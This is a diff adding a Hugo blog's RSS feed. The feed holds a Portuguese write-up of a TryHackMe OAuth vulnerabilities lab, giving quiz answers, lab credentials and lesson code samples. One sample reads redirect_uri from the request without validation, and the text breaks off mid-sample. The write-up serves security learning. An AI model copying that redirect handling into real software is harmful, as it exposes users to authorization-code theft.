@@ -1,0 +1,508 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Alex Paulino – Auth</title>
+    <link>http://localhost:1313/tags/auth/</link>
+    <description>Recent content in Auth on Alex Paulino</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>pt</language>
+    <lastBuildDate>Mon, 17 Feb 2025 11:00:00 -0300</lastBuildDate>
+    
+	  <atom:link href="http://localhost:1313/tags/auth/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+      
+        
+      
+    
+    
+    <item>
+      <title>OAuth Vulnerabilities</title>
+      <link>http://localhost:1313/posts/2025/2025-02-17-oauth/</link>
+      <pubDate>Mon, 17 Feb 2025 11:00:00 -0300</pubDate>
+      
+      <guid>http://localhost:1313/posts/2025/2025-02-17-oauth/</guid>
+      <description>
+        
+        
+        &lt;h2 data-hextra-search-id=&#34;objetivos&#34;&gt;Objetivos&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;objetivos&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#objetivos&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;Conceitos essenciais sobre OAuth 2.0.&lt;/li&gt;
+&lt;li&gt;O fluxo do OAuth 2.0.&lt;/li&gt;
+&lt;li&gt;Identificar serviços de OAuth.&lt;/li&gt;
+&lt;li&gt;Explorar técnicas.&lt;/li&gt;
+&lt;li&gt;Evolução do OAuth 2.1.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;A aula pode ser encontrada aqui &lt;a
+    href=&#34;https://tryhackme.com/r/room/oauthvulnerabilities&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;room 0Auth&lt;/a&gt;
+Irei documentar a aula e seus exercícios propostos.&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;conceitos-chaves&#34;&gt;Conceitos chaves&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;conceitos-chaves&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#conceitos-chaves&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3 data-hextra-search-id=&#34;proprietário-do-recurso&#34;&gt;Proprietário do recurso&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;proprietário-do-recurso&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#propriet%c3%a1rio-do-recurso&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;O proprietário do recursos pode ser uma pessoa ou sistema, que controla um certo tipo de dado e pode autorizar uma aplicação a acessar este dado em seu nome. O conceito fundamental gira em torno do usuário, seu consentimento e controle, por exemplo, você é o proprietário do recurso como um cliente da cafeteria. Você pode controlar as informações da sua conta e conceder permissão ao aplicativo móvel da cafeteria para acessar seus dados.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;cliente&#34;&gt;Cliente&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;cliente&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#cliente&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;O cliente pode ser um aplicativo mobile ou uma aplicação web (&lt;em&gt;server side&lt;/em&gt;), desempenha o papel de intermediário, requisitando acesso aos recursos e executando ações com a permissão do proprietário do recurso. Exemplo, o aplicativo ou aplicação web realiza os pagamentos dos pedidos, o proprietário do recurso autoriza o acesso aos detalhes da conta e informações de pagamento.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;servidor-de-autorização&#34;&gt;Servidor de autorização&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;servidor-de-autorização&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#servidor-de-autoriza%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;O servidor de autorização é responsável por emitir tokens de acesso ao cliente após autenticar com sucesso o proprietário do recurso e obter sua autorização.O servidor de autorização desempenha um papel crucial no processo OAuth, garantindo que o cliente receba permissão somente após autenticação e consentimento do usuário legítimo. O servidor de autorização controla as autenticações e autorizações, verifica suas credenciais e concede permissões para aplicação web( ou app mobile) acessar a sua conta.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;servidor-de-recurso&#34;&gt;Servidor de recurso&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;servidor-de-recurso&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#servidor-de-recurso&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;O servidor que hospeda os recursos protegidos pode aceitar e responder a solicitações de recursos protegidos usando tokens de acesso. Este servidor garante que apenas clientes autenticados e autorizados possam acessar ou manipular os dados do proprietário do recurso.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;concessão-de-autorização&#34;&gt;Concessão de Autorização&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;concessão-de-autorização&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#concess%c3%a3o-de-autoriza%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;O cliente usa uma credencial que representa a autorização do proprietário do recurso.
+Os principais tipos de concessão são:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Authorization Code&lt;/li&gt;
+&lt;li&gt;Implicit&lt;/li&gt;
+&lt;li&gt;Resource Owner Password Credentials&lt;/li&gt;
+&lt;li&gt;Client Credentials&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 data-hextra-search-id=&#34;token-de-acesso&#34;&gt;Token de acesso&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;token-de-acesso&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#token-de-acesso&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;É uma credencial que o cliente usa para acessar recursos protegidos em nome do proprietário do recurso. Esses tokens possuem uma vida útil. São essenciais para manter a segurança nas comunicações entre o cliente e o servidor de recurso, sem a necessidade de solicitar as credenciais do proprietário do recurso a cada requisição.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;token-de-atualização&#34;&gt;Token de atualização&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;token-de-atualização&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#token-de-atualiza%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;É uma credencial que o cliente pode usar para obter um novo token de acesso sem exigir que o proprietário do recurso se autentique novamente. Os tokens de atualização geralmente têm uma vida útil longa e fornecem uma maneira de manter sessões de usuário sem interrupções frequentes de login.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;redirecionar-uri&#34;&gt;Redirecionar URI&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;redirecionar-uri&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#redirecionar-uri&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;O URI para o qual o servidor de autorização redirecionará o &lt;em&gt;user-agent&lt;/em&gt; do proprietário do recurso após a concessão ou negação da autorização. Ele verifica se o cliente para o qual a resposta de autorização foi solicitada está correto.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;escopo&#34;&gt;Escopo&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;escopo&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#escopo&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Escopos são um mecanismo para limitar o acesso de um aplicativo à conta de um usuário. Eles permitem que o cliente especifique o nível de acesso necessário e que o servidor de autorização informe ao usuário quais níveis de acesso o aplicativo está solicitando. Escopos ajudam a impor o princípio do menor privilégio.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;parâmetro-de-estado&#34;&gt;Parâmetro de estado&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;parâmetro-de-estado&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#par%c3%a2metro-de-estado&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Um parâmetro opcional, mantém o estado entre o cliente e o servidor de autorização. Ele pode ajudar a evitar ataques CSRF ao garantir que a resposta corresponda à solicitação do cliente. O parâmetro state é uma parte crucial da proteção do fluxo OAuth.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;token-e-endpoint-de-autorização&#34;&gt;Token e endpoint de autorização&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;token-e-endpoint-de-autorização&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#token-e-endpoint-de-autoriza%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;O endpoint do servidor de autorização é onde o cliente troca a concessão de autorização (ou token de atualização) por um token de acesso. Em contraste, o endpoint de autorização é onde o proprietário do recurso é autenticado e autoriza o cliente a acessar os recursos protegidos.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Which (optional) parameter can be used to prevent CSRF attacks?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;state&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What credentials can the client use to access protected resources on behalf of the resource owner?&lt;/strong&gt;&lt;br&gt;
+Resposta:&lt;code&gt;Access token&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;tipos-de-concessão-de-oauth&#34;&gt;Tipos de concessão de OAuth&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;tipos-de-concessão-de-oauth&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#tipos-de-concess%c3%a3o-de-oauth&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Discutiremos abaixo os principais tipos de concessão que OAuth fornece para diversos tipos de cenários e clientes.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;concessão-de-código-de-autorização&#34;&gt;Concessão de código de autorização&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;concessão-de-código-de-autorização&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#concess%c3%a3o-de-c%c3%b3digo-de-autoriza%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;É o tipo mais frequente, é mais adequado para aplicações &lt;em&gt;server side&lt;/em&gt;, por exemplo: PHP, JAVA, .NET, etc. Nesse cenário, o cliente redireciona o usuário para o servidor de autorização, onde realiza a autenticação e concede autorização. O servidor de autorização redireciona o usuário para o cliente com um código de autorização. Então, o cliente troca esse código por um token e, com esse token, o cliente solicita ao servidor de recurso o &lt;em&gt;endpoint&lt;/em&gt; para acesso ao recurso solicitado.&lt;/p&gt;
+&lt;p&gt;Esse tipo de concessão aprimora a segurança, garantindo que o token de acesso não será exposto, visto que a troca de código de autorização e token é feita entre os servidores, evitando assim vazamentos&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;concessão-implícita&#34;&gt;Concessão implícita&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;concessão-implícita&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#concess%c3%a3o-impl%c3%adcita&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Principalmente utilizado em aplicativos móveis e aplicações web, onde não ocorre o armazenamento seguro do segredo. Um token de acesso é emitido diretamente para o cliente, sem a necessidade de um código de autorização. Nesse cenário, o cliente redireciona o usuário para o servidor de autorização. Depois de autorizado e a concessão realizada, o servidor de autorização retorna com o token de acesso na URL.&lt;/p&gt;
+&lt;p&gt;Esse tipo de concessão realiza menos etapas e é mais rápido, porém, é menos seguro e expõe o token na URL. Além disso, não suporta a atualização do token.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;concessão-de-credenciais-de-senha-do-proprietário-do-recurso&#34;&gt;Concessão de credenciais de senha do proprietário do recurso&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;concessão-de-credenciais-de-senha-do-proprietário-do-recurso&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#concess%c3%a3o-de-credenciais-de-senha-do-propriet%c3%a1rio-do-recurso&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Correção Gramatical:
+Utilizada quando o usuário possui alta confiança no cliente, as credenciais são enviadas para o cliente, que então envia as credenciais para o servidor de autorização. O servidor de autorização verifica as credenciais e, após isso, emite o token.&lt;/p&gt;
+&lt;p&gt;Recomendado somente em cenários onde o usuário confia na aplicação, como em aplicações first party. Este método requer menos interações, mas possui menos segurança.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;concessão-de-credenciais-do-cliente&#34;&gt;Concessão de credenciais do cliente&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;concessão-de-credenciais-do-cliente&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#concess%c3%a3o-de-credenciais-do-cliente&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Utilizado entre servidores, sem o envolvimento do usuário, são usadas as credenciais do cliente (client ID e um segredo). O cliente interage com o servidor de autorização com essas credenciais, e o servidor emite um token de acesso.&lt;/p&gt;
+&lt;p&gt;Utilizado entre servidores e serviços de backend, reduz os riscos de segurança, pois nenhum dado do usuário é exposto.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;What is the grant type often used for server-server interaction?&lt;/strong&gt;&lt;br&gt;
+Resposta: &lt;code&gt;Client Credentials&lt;/code&gt;&lt;/p&gt;
+&lt;h2 data-hextra-search-id=&#34;como-funciona-oauth&#34;&gt;Como funciona OAuth&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;como-funciona-oauth&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#como-funciona-oauth&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Para temos uma compreensão melhor do funcionamento como um todo, vamos utilizar a imagem fornecida na aula.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/example.png&#34; alt=&#34;example&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;No laboratório, iremos nos autenticar no &lt;code&gt;CoffeShopApp&lt;/code&gt; usando OAuth com as credenciais fornecidas abaixo:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;: &lt;code&gt;victim:victim123&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;: &lt;code&gt;attacker:tesla@123&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;O &lt;em&gt;client&lt;/em&gt; é &lt;code&gt;http://bistro.thm:8000&lt;/code&gt;, onde o usuário pretende logar utilizando suas credenciais da conta do &lt;code&gt;CoffeShopApp&lt;/code&gt;. Sendo assim:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Client: &lt;code&gt;http://bistro.thm:8000&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Servidor de autorização: &lt;code&gt;CoffeShopApp&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 data-hextra-search-id=&#34;solicitação-de-autorização&#34;&gt;Solicitação de autorização&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;solicitação-de-autorização&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#solicita%c3%a7%c3%a3o-de-autoriza%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Quando acessamos o &lt;code&gt;bistro.thm&lt;/code&gt; temos a opção de logar com OAuth.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/bistro_auth.png&#34; alt=&#34;bistroAuth&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Quando clicamos no botão somos redirecionados para o servidor de autorização.
+Realizando o &lt;em&gt;decode&lt;/em&gt; da URI para melhor visualização:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://coffee.thm:8000/accounts/login/?next=/o/authorize/?client_id=zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt&amp;amp;response_type=code&amp;amp;redirect_uri=http://bistro.thm:8000/oauthdemo/callback&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/coffe_auth.png&#34; alt=&#34;coffeAuth&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Os campos da URI são:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;response_type=code&lt;/code&gt;: Indica que o &lt;code&gt;CoffeShopApp&lt;/code&gt; está esperando o código de autorização.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;state&lt;/code&gt;: Um token CSRF, garante que a requisição e a resposta são parte da mesma transação.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;client_id&lt;/code&gt;: Identificador público, identifica a aplicação cliente.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;redirect_uri&lt;/code&gt;: A URL para onde o servidor de autorização enviará o usuário depois que ele conceder permissão.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;scope&lt;/code&gt;: Especifica o nível de acesso.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Com essas informações, que serão passadas pelo &lt;code&gt;bistro app&lt;/code&gt;, o servidor de autorização entenderá a requisição e para onde deve redirecionar o usuário após as verificações. Exemplo de um código Python fornecido na aula.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;oauth_login&lt;/span&gt;(request): 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	app &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Application&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CoffeeApp&amp;#34;&lt;/span&gt;) 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	redirect_uri &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; request&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GET&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;redirect_uri&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://bistro.thm:8000/oauthdemo/callback&amp;#34;&lt;/span&gt;) 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	authorization_url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ( 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://coffee.thm:8000/o/authorize/?client_id=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;app&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;client_id&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;amp;response_type=code&amp;amp;redirect_uri=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;redirect_uri&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	) 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; redirect(authorization_url)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50&#34;
+    title=&#34;Copiar código&#34;
+    aria-label=&#34;Copiar código&#34;
+    data-copied-label=&#34;Copiado!&#34;
+  &gt;
+    &lt;div class=&#34;hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+&lt;div class=&#34;hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3 data-hextra-search-id=&#34;autenticando-e-autorizando&#34;&gt;Autenticando e autorizando&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;autenticando-e-autorizando&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#autenticando-e-autorizando&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Quando usuário alcança o servidor de autorização é solicitado suas credenciais, após verificações, é mostrado ao usuário quais são as permissões que o &lt;code&gt;bistro app&lt;/code&gt;está solicitando.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/server_permissions.png&#34; alt=&#34;server Permissions&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;resposta-de-autorização&#34;&gt;Resposta de autorização&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;resposta-de-autorização&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#resposta-de-autoriza%c3%a7%c3%a3o&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Após o usuário conceder o acesso, é gerado um código, o usuário é redirecionado para a página do &lt;code&gt;bistro app&lt;/code&gt;, juntamente com esse código.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/assets/img/posts/2025/02/auth/network_dev_tools_web.png&#34; alt=&#34;webtools&#34;  loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Após obter o código de autorização o &lt;code&gt;bistro app&lt;/code&gt; solicita o token de acesso para o servidor de autorização.&lt;/p&gt;
+&lt;h3 data-hextra-search-id=&#34;token-de-acesso-1&#34;&gt;Token de acesso&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;token-de-acesso-1&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#token-de-acesso-1&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Link permanente para esta secção&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Bistro troca o código de autorização por um token de acesso através de uma requisição &lt;code&gt;POST&lt;/code&gt; ao &lt;em&gt;endpoint&lt;/em&gt; do servidor de autorização, utilizando os seguintes parâmetros.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;grant_type&lt;/code&gt;: tipo de concessão que está sendo usado, é definido um &lt;code&gt;code&lt;/code&gt;para especificar o código de autorização como o tipo de concessão.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;code&lt;/code&gt;: código de autorização recebido do servidor de autorização.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;redirect_uri&lt;/code&gt;: deve corresponder com URI original fornecida na requisição de autorização.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;client_id and client_secret&lt;/code&gt;: credenciais para autenticação do aplicativo cliente.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Exemplo de código fornecido na aula, utilizando os parâmetros acima.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code&#34;&gt;
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;token_url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://coffee.thm:8000/o/token/&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	client_id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Application&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CoffeeApp&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;client_id 
